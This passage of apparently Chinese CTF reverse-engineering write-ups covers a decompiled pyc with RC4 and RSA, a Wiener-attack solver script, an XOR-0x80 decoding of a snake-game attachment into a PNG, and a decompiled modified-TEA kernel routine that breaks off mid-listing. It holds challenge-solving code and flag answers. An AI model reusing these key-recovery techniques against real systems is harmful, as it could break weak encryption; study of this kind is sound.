class="code"><pre><span class="line">55 0D 0D 0A 00 00 00 00 70 79 69 30 10 01 00 00</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329200719067.png" alt="image-20230329200719067"></p><p>然后在线反编译</p><p>使用<a href="https://tool.lu/pyc/%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%E5%BE%97%E5%88%B0%E6%BA%90%E7%A0%81">https://tool.lu/pyc/反编译pyc文件得到源码</a></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    data_xor_iv = <span class="built_in">bytearray</span>()</span><br><span class="line">    sbox = []</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    x = y = k = <span class="number">0</span></span><br><span class="line">    key = <span class="string">'911dcd09ad021d68780e3efed1aa8549'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        sbox.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = j + sbox[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">255</span></span><br><span class="line">        sbox[i] = sbox[j]</span><br><span class="line">        sbox[j] = sbox[i]</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> text:</span><br><span class="line">        x = x + <span class="number">1</span> &amp; <span class="number">255</span></span><br><span class="line">        y = y + sbox[x] &amp; <span class="number">255</span></span><br><span class="line">        sbox[x] = sbox[y]</span><br><span class="line">        sbox[y] = sbox[x]</span><br><span class="line">        k = sbox[sbox[x] + sbox[y] &amp; <span class="number">255</span>]</span><br><span class="line">        data_xor_iv.append(idx ^ k)</span><br><span class="line">    <span class="keyword">return</span> data_xor_iv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">'%e8%af%b7%e8%be%93%e5%85%a5flag&gt; '</span>)</span><br><span class="line">    pub_key = [</span><br><span class="line">        <span class="number">0x1B6A7561D99E6FC35BA3C241159424698BF3CAC017CFCE8BB325CC9AF9CBCBDB3997B08D922C8705FC3EEAEF50D60ADAB2757A7204715483A1D612502970595358BCFE9CD11C98CAD293EB921D777F4F910905D79CDCA5C1EC1FBA5DA74DB165F82BBE29EA0B2E597860FC6D2C51C12D46BF11AFA5018496DDFC3474B10B4457L</span>,</span><br><span class="line">        <span class="number">0x6C8E1CC5B384DE3B3316C22CF72D9895406298E172B5F4D890BDC04889BB43CD4892689DE701C84ED68B4CBC7193926BCCB0A4F259D2E752FAEF3CD590A793F120D15424AEB3CD53F5D59B5D41D699694ABF4F01532F0F1CE127B07958FB874982E757EF97643335376790BC990CEE9D7F0D05DA90AD62084C88BFA9C9BEB683L</span>]</span><br><span class="line">    m = libnum.s2n(flag)</span><br><span class="line">    c = <span class="built_in">str</span>(<span class="built_in">pow</span>(m, pub_key[<span class="number">0</span>], pub_key[<span class="number">1</span>]))</span><br><span class="line">    q = <span class="string">b'EeJWrgtF+5ue9MRiq7drUAFPtrLATlBZMBW2CdWHRN73Hek7DPVIYDHtMIAfTcYiEV87W7poChqpyUXYI3+/zf5yyDOyE9ARLfa5qilXggu60lmQzFqvFv+1uOaeI2hs2wx+QZtxqGZzC0VCVWvbTQ52nA2UdUtnk8VezRMPMfmf7rOqPxDTv/aacLnI3RdLG2TbT52qtN4+naejI7Xe8HLOL765OZKdDBERKwd5ARQ3UL6YPbuOKOQahIFddnIX6rZ7dTNqCUDOjfJbMdrzJVDNjmNlkLNtYFo7M65Wfwj6PV5vvtT33FsmH50/YLEasnlCiJujYOgi2KCdf5msz1dPEvrXDDL6Csnjo+6m/44RzlluzcqMS5ZJFdrHEh68LIqtu+HCO+69Dyq4e22APq8wgN9kU6R8kikXSn/Ej0N/jOvomFCbkHskRl8xP1KgWFW0SMVDlaDCM4EKG812VgDWgSYOUnVhVpz65uOtg4Z8PrPI+BW4398dQYhD24D9EIPgvtmhNrHiEHouB46ElTGQgZBhtn6y9tL1sw=='</span></span><br><span class="line">    v = encrypt(base64.b64encode(c.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    v = base64.b64encode(v)</span><br><span class="line">    <span class="keyword">if</span> v == q:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'You are right!'</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'winer winer winnie dinner'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Do you think the encryption and decryption are the same?'</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>到这  我就不会了</p><p>然后到话  下面呢</p><p>请教队里的师傅  帮忙写的</p><p>太厉害了  我好菜</p><p>Orz Orz</p><p>贴一下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x, y</span>):  <span class="comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">    numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从sublist的后面往前循环</span></span><br><span class="line">        denominator, numerator = numerator, i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator, numerator  <span class="comment"># 得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解每个渐进分数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">    res = transform(x, y)</span><br><span class="line">    <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par = gmpy2.isqrt(b*b-<span class="number">4</span>*a*c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b+par)//(<span class="number">2</span>*a), (-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> sub_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-<span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e*d-<span class="number">1</span>)//k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n-phi+<span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px*qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"该方法不适用"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#e = 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span></span><br><span class="line"><span class="comment">#n = 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span></span><br><span class="line"><span class="comment">#c = 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span></span><br><span class="line">pub_key = [<span class="number">0x1B6A7561D99E6FC35BA3C241159424698BF3CAC017CFCE8BB325CC9AF9CBCBDB3997B08D922C8705FC3EEAEF50D60ADAB2757A7204715483A1D612502970595358BCFE9CD11C98CAD293EB921D777F4F910905D79CDCA5C1EC1FBA5DA74DB165F82BBE29EA0B2E597860FC6D2C51C12D46BF11AFA5018496DDFC3474B10B4457</span>,<span class="number">0x6C8E1CC5B384DE3B3316C22CF72D9895406298E172B5F4D890BDC04889BB43CD4892689DE701C84ED68B4CBC7193926BCCB0A4F259D2E752FAEF3CD590A793F120D15424AEB3CD53F5D59B5D41D699694ABF4F01532F0F1CE127B07958FB874982E757EF97643335376790BC990CEE9D7F0D05DA90AD62084C88BFA9C9BEB683</span>]</span><br><span class="line"></span><br><span class="line">c=<span class="number">9197325807645612228390676898165339983130548652295654839867942074997683918988965926084503420887591899752302425508517254065925348804993207641876641922956619138627889163346353214827511032968059044881520153145551162531743849668155869037977721861493727920155941109549597908826026808895049130862236739911496237434</span></span><br><span class="line"></span><br><span class="line">d = wienerAttack(pub_key[<span class="number">0</span>], pub_key[<span class="number">1</span>])</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, pub_key[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b'flag{chinese_zhenghan}'</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字网络安全人才挑战赛2023-逆向区WriteUp</title>
      <link href="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/"/>
      <url>/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="game-misc？"><a href="#game-misc？" class="headerlink" title="game- misc？"></a>game- misc？</h1><h2 id="情景再现（非预期）"><a href="#情景再现（非预期）" class="headerlink" title="情景再现（非预期）"></a>情景再现（非预期）</h2><p>附件给了两个， 程序是个贪吃蛇？</p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325164723412.png" alt="image-20230325164723412"></p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325164929268.png" alt="image-20230325164929268"></p><p>查壳</p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325164750590.png" alt="image-20230325164750590"></p><p>然后拖入ida分析</p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325164850328.png" alt="image-20230325164850328"></p><p><strong>发现这儿有个png文件  要被读取， 那么根据 <del>经验</del> 给的另一个附件 感觉就是把那个文件变为png  然后读出flag</strong></p><p>核心： </p><p><strong>计算出 怎么把给的附件  变为 png 的文件头</strong></p><p>根本就不用看程序到底是干啥的</p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325165930097.png" alt="image-20230325165930097"></p><p><strong>计算出 ^ 0x80 正好是png的文件头</strong></p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325165909083.png" alt="image-20230325165909083"></p><p>然后exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="built_in">open</span>(<span class="string">"sinke"</span>, mode=<span class="string">"rb"</span>)</span><br><span class="line">encData = enc.read()</span><br><span class="line"></span><br><span class="line">encDataLen = <span class="built_in">len</span>(encData)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出的文件</span></span><br><span class="line">decData = <span class="built_in">open</span>(<span class="string">r"flag.png"</span>, <span class="string">"wb"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">b"0x80"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环解密</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(encDataLen):</span><br><span class="line">    decData.write(<span class="built_in">bytes</span>([encData[i] ^ <span class="number">0x80</span>]))</span><br><span class="line"></span><br><span class="line">decData.close()</span><br><span class="line"></span><br><span class="line">enc.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>然后  得到flag</p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325170155482.png" alt="image-20230325170155482"></p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p><del>没有 预期解</del>  各种花里胡哨的 操作都能做出来   </p><p>正经人  谁去 玩游戏</p><p>逆向就是来破解的（Orz）</p><p>然后的话  笔者的思路就是上面那样</p><p>（感觉出题人应该随便拿以前做的某个项目 做一层迷惑 然后  当作签到题嘛 嘿嘿）</p><h1 id="easykernel-魔改tea系列"><a href="#easykernel-魔改tea系列" class="headerlink" title="easykernel - 魔改tea系列"></a>easykernel - 魔改tea系列</h1><p>？ kernel - 内核</p><p>我拿到 我想 what？  让我去找的漏洞嘛</p><p>.ko 就是内核文件</p><p>不扯了  讲思路</p><p>直接拖入ida 静态分析</p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325171655863.png" alt="image-20230325171655863"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall dev_write(__int64 a1, __int64 a2, unsigned __int64 a3)</span><br><span class="line">{</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // edx</span><br><span class="line">  unsigned <span class="built_in">int</span> <span class="built_in">sum</span>; // eax</span><br><span class="line">  <span class="built_in">int</span> key2; // er15</span><br><span class="line">  unsigned <span class="built_in">int</span> v6; // er11</span><br><span class="line">  <span class="built_in">int</span> key4; // er13</span><br><span class="line">  <span class="built_in">int</span> key5; // er12</span><br><span class="line">  unsigned <span class="built_in">int</span> v9; // ebx</span><br><span class="line">  unsigned <span class="built_in">int</span> v10; // er10</span><br><span class="line">  unsigned <span class="built_in">int</span> v11; // er9</span><br><span class="line">  unsigned <span class="built_in">int</span> v12; // edi</span><br><span class="line">  unsigned <span class="built_in">int</span> v13; // esi</span><br><span class="line">  unsigned <span class="built_in">int</span> v14; // er8</span><br><span class="line">  unsigned <span class="built_in">int</span> v15; // ecx</span><br><span class="line">  <span class="built_in">int</span> v16; // er12</span><br><span class="line">  <span class="built_in">int</span> key9; // [rsp+4h] [rbp-B4h]</span><br><span class="line">  <span class="built_in">int</span> key8; // [rsp+8h] [rbp-B0h]</span><br><span class="line">  <span class="built_in">int</span> key7; // [rsp+Ch] [rbp-ACh]</span><br><span class="line">  <span class="built_in">int</span> key6; // [rsp+10h] [rbp-A8h]</span><br><span class="line">  <span class="built_in">int</span> key3; // [rsp+14h] [rbp-A4h]</span><br><span class="line">  <span class="built_in">int</span> key1; // [rsp+18h] [rbp-A0h]</span><br><span class="line">  __int64 v25[<span class="number">2</span>]; // [rsp+28h] [rbp-90h]</span><br><span class="line">  __int64 s2[<span class="number">4</span>]; // [rsp+38h] [rbp-80h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v27; // [rsp+58h] [rbp-60h]</span><br><span class="line">  unsigned <span class="built_in">int</span> s1; // [rsp+5Ch] [rbp-5Ch] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v29; // [rsp+60h] [rbp-58h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v30; // [rsp+64h] [rbp-54h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v31; // [rsp+68h] [rbp-50h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v32; // [rsp+6Ch] [rbp-4Ch]</span><br><span class="line">  unsigned <span class="built_in">int</span> v33; // [rsp+70h] [rbp-48h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v34; // [rsp+74h] [rbp-44h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v35; // [rsp+78h] [rbp-40h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v36; // [rsp+7Ch] [rbp-3Ch]</span><br><span class="line">  unsigned __int64 v37; // [rsp+80h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  v37 = __readgsqword(0x28u);</span><br><span class="line">  v27 = <span class="number">1182995140</span>;</span><br><span class="line">  s2[<span class="number">0</span>] = 0x7FB3950C883B3AALL;</span><br><span class="line">  s2[<span class="number">1</span>] = 0x7AB57E2775BC5959LL;</span><br><span class="line">  s2[<span class="number">2</span>] = 0xADA35753C0249800LL;</span><br><span class="line">  s2[<span class="number">3</span>] = 0x6E14AF04BF1D493FLL;</span><br><span class="line">  v25[<span class="number">0</span>] = 0xE000004DBLL;</span><br><span class="line">  v25[<span class="number">1</span>] = 0x2A600000017LL;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">0x23</span> )</span><br><span class="line">    copy_from_user(&amp;s1, a2, 36LL);</span><br><span class="line">  key1 = <span class="number">14</span>;</span><br><span class="line">  v3 = v36;</span><br><span class="line">  <span class="built_in">sum</span> = <span class="number">0x67616C66</span>;</span><br><span class="line">  key2 = <span class="number">678</span>;</span><br><span class="line">  key3 = <span class="number">23</span>;</span><br><span class="line">  v6 = v29;</span><br><span class="line">  key4 = <span class="number">1243</span>;</span><br><span class="line">  key5 = <span class="number">14</span>;</span><br><span class="line">  key6 = <span class="number">678</span>;</span><br><span class="line">  v9 = s1;                                      // 这是原密钥</span><br><span class="line">  key7 = <span class="number">1243</span>;</span><br><span class="line">  v10 = v30;</span><br><span class="line">  key8 = <span class="number">14</span>;</span><br><span class="line">  v11 = v31;</span><br><span class="line">  v12 = v33;</span><br><span class="line">  v13 = v34;</span><br><span class="line">  key9 = <span class="number">23</span>;</span><br><span class="line">  v14 = v32;</span><br><span class="line">  v15 = v35;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v9 += ((v3 ^ key5) + (v6 ^ <span class="built_in">sum</span>)) ^ (((<span class="number">4</span> * v6) ^ (v3 &gt;&gt; <span class="number">5</span>)) + ((v6 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v3)));</span><br><span class="line">    v6 += ((v9 ^ key4) + (v10 ^ <span class="built_in">sum</span>)) ^ (((<span class="number">4</span> * v10) ^ (v9 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v9) ^ (v10 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">    v10 += ((v6 ^ key2) + (<span class="built_in">sum</span> ^ v11)) ^ (((<span class="number">4</span> * v11) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v6) ^ (v11 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">    v11 += ((v10 ^ key9) + (<span class="built_in">sum</span> ^ v14)) ^ (((<span class="number">4</span> * v14) ^ (v10 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v10) ^ (v14 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">    v14 += ((v11 ^ key8) + (v12 ^ <span class="built_in">sum</span>)) ^ (((<span class="number">4</span> * v12) ^ (v11 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v11) ^ (v12 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">    v12 += ((v14 ^ key7) + (v13 ^ <span class="built_in">sum</span>)) ^ (((<span class="number">4</span> * v13) ^ (v14 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v14) ^ (v13 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">    v13 += ((v12 ^ key6) + (v15 ^ <span class="built_in">sum</span>)) ^ (((<span class="number">4</span> * v15) ^ (v12 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v12) ^ (v15 &gt;&gt; <span class="number">3</span>)));// 移位混合运算</span><br><span class="line">    v15 += ((v13 ^ key3) + (<span class="built_in">sum</span> ^ v3)) ^ (((<span class="number">16</span> * v13) ^ (v3 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * v3) ^ (v13 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">    v16 = (v15 ^ key1) + (v9 ^ <span class="built_in">sum</span>);</span><br><span class="line">    <span class="built_in">sum</span> += <span class="number">0x67616C66</span>;</span><br><span class="line">    v3 += v16 ^ (((<span class="number">16</span> * v15) ^ (v9 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * v9) ^ (v15 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sum</span> == <span class="number">0xD89114C8</span> )                    // <span class="number">0xD89114C8</span> = <span class="number">12</span> *<span class="number">0x67616C66</span></span><br><span class="line">      <span class="keyword">break</span>;                                    // <span class="built_in">sum</span> == <span class="number">0xD89114C8</span></span><br><span class="line">                                                // 跳出<span class="keyword">while</span></span><br><span class="line">                                                // 执行原密钥流</span><br><span class="line">    key5 = *((_DWORD *)v25 + ((<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>));</span><br><span class="line">    key2 = 